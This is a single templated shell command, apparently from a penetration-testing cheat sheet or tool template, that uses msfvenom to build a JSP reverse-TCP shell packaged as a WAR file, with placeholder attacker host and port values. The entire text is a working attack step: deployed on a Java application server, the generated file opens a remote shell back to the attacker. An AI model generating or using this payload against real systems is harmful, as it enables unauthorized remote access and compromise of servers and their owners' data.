msfvenom -p java/jsp_shell_reverse_tcp -f war -o ./shell.war LHOST={{ LHOST }} LPORT={{ LPORT }}
